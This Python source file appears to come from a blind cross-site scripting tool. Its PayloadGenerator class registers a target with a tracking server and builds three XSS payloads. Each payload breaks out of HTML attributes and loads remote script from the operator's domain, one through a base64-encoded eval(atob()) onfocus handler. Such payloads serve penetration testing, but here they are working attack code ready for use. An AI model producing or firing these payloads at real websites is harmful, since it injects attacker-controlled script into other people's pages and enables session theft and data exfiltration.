from base64 import b64encode
from modules.config import Config
import shortuuid
import requests

class PayloadGenerator:
    def __init__(self):
        self.config = Config()
        self.payloads = []

    def generate_payloads(self, target):
        if (self.config.domain == ''):
            print(f"Please set the domain in the config file. ({Config().config_location})")
            exit()
        unique_id = shortuuid.ShortUUID().random(length=10)
        
        # broadcast the uid with the target info to the server
        payload = {
            'target': target,
            'uid': unique_id
        }
        try:
            response = requests.post(f'http://{self.config.domain}/api/cli/track', json=payload, headers={'Content-Type': 'application/json', 'Authorization': f"Token {self.config.api_key}"})
            if response.status_code != 200:
                if (response.status_code == 403):
                    print(f"Invalid API key. Please check your config file. ({Config().config_location})")
                    exit()
                else:
                    print(f"Error communicating with bxss server: {response.status_code} - {response.text}")
                    exit()
        except requests.exceptions.RequestException as e:
            print(f"Error communicating with bxss server: {e}")
            exit()

        base64Code = f'var a=document.createElement("script");a.src="//{self.config.domain}/{unique_id}";document.body.appendChild(a);'.encode('utf-8')
        base64Code =b64encode(base64Code).decode('utf-8')

        payloads = [
            f'\"\'><script src="//{self.config.domain}/{unique_id}"></script>',
            f'\"\'><style/onload=import("//{self.config.domain}/{unique_id}")></style>',
            f'\'\"><input on onfocus=eval(atob(this.id)) id={base64Code} autofocus>'
        ]
        self.payloads = unique_id, payloads

    def get_payloads(self, target):
        self.generate_payloads(target)
        return self.payloads